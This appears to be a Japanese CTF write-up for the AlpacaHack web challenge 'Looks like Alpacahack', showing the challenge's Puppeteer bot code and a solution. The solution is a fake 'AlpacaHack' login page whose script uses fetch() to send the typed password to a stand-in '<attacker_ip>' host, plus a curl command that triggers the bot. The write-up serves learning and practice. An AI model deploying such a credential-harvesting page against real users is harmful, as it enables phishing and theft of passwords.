---
title: Daily-AlpacaHack 「Looks like Alpacahack」Medium
description: 攻撃者が用意したページ経由でFLAGを漏洩させられるフィッシング問題
date: 2026-06-18 9:40:00 +0900
categories: [CyberSecurity, CTF]
tags: [daily_alpaca_hack, web, vuln/phishing]
---

# 20260617-daily_alpaca-web-medium-looks_like_alpacahack

## Summary

本問は，用意されたBOTを自身が用意した罠サイトに誘導し，Flagを漏洩させるPhishingに関する問題です．

> - **Category**: Web
> - **Description**: 今日もAlpacaHackにログインするか...
> - **Tools & TechStack**:
> 	- nodejs
> - **Release**: 2026/06/17
{: .prompt-info }

**階層構造**
```
.
├── bot
│   ├── bot.js
│   ├── Dockerfile
│   ├── index.js
│   ├── package.json
│   ├── package-lock.json
│   └── views
│       └── index.ejs
└── compose.yaml

3 directories, 7 files
```

---
## ソースコードの調査

ソースコードを読むと，**Flagが出力される条件** として以下の処理が実装されていることが分かりました．
また，入力できる `url` は，`http:// || https://` を満たしていればよく，CSPも設定されていないため，オリジンを気にする必要もありません．そのため，任意のサイトを使用できます．

- BOTに渡されたurl先に，`name = password` を満たす `input` タグ等の文字列が入力可能なDOM要素が存在する場合，そこに `FLAG` が入力される．
- BOTが動作するためには，クロール対象の `Title` タグの中身が，`AlpacaHack` として設定されていること．

自分でサイトをデプロイするのは面倒なため，この問題の作者の方が開発した `RequestBin`[^1] というサービスを利用します．

`index.js`
```javascript
import puppeteer from "puppeteer";

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const FLAG = process.env.FLAG ?? "Alpaca{DUMMY}";

export const visit = async (url) => {
  console.log(`Start visiting: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    pipe: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  try {
    const page = await browser.newPage();
    await page.goto(url, { timeout: 5000, waitUntil: "domcontentloaded" });

    // Checks "AlpacaHack" occurs in <title> tag.
    const title = await page.title();
    if (!title.includes("AlpacaHack")) {
      await page.close();
      return;
    }

    // Input username and password
    await page.type("input[name=email]", "alpaca@example.com");
    await page.type("input[name=password]", FLAG);

    await sleep(5000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await browser.close();

  console.log(`End visiting: ${url}`);
};
```

`bot/bot.js`
```javascript
import express from "express";
import rateLimit from "express-rate-limit";
import { visit } from "./bot.js";

const app = express();
app.use(express.json());
app.set("view engine", "ejs");

app.get("/", async (_req, res) => {
  return res.render("./index.ejs");
});

// Limit each IP address to 4 requests per minute
app.use("/api", rateLimit({ windowMs: 60 * 1000, max: 4 }));

app.post("/api/report", async (req, res) => {
  const { url } = req.body;
  
  if (
    typeof url !== "string" ||
    (!url.startsWith("http://") && !url.startsWith("https://"))
  ) {
    return res.status(400).send("Invalid url");
  }

  try {
    await visit(url);
    return res.send("OK");
  } catch (e) {
    console.error(e);
    return res.status(500).send("Something wrong");
  }
});

app.listen(1337, () => {
  console.log('Server listening on port 1337');
});
```

## RequestBin で簡易サイトをデプロイ

`name = password` のDOM要素に，`FLAG` が入力されるため，`addEventListener` で要素の変更を検知し，自サーバにクエリパラメータとして送信します．
また，自サーバには，**Webhook.site**[^2] を使用しました．(多分，RequestBinのログ機能だけでもいける...?)

- **Method**: `GET`
- **Status Code**: `200 OK`
- **Content-Type**: `text/html; charset=UTF-8`

```html
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <!-- Bypass: !title.includes("AlpacaHack") -->
    <title>AlpacaHack</title>
</head>

<body>
    <form>
        <label for="email">Email:</label>
        <input type="email" name="email" id="email">
        <label for="password">Password:</label>
        <input type="password" name="password" id="password">
    </form>

    <script language="JavaScript">
        const input = document.getElementById('password');
        input.addEventListener('input', (e) => {
            const flag = e.target.value;
            fetch(`https://<attacker_ip>/?flag=${encodeURIComponent(flag)}`);
        });
    </script>
</body>
</html>
```

## Exploitation

あとは，`api/report` を叩けば，htmlの `<attacker_ip>` に設定しているサーバのログに通信が流れ，`FLAG` が取得できました．

```shell
$ curl -X POST http://<ip>:<port>/api/report \       
     -H "Content-Type: application/json" \
     -d '{"url":"<request_bin_url>"}'
```

---
## Post-Mortem & Dead ends

## References

[^1]: [GitHub - alpacahack/requestbin · GitHub](https://github.com/alpacahack/requestbin)

[^2]: [Webhook.site - Test, transform and automate Web requests and emails](https://webhook.site)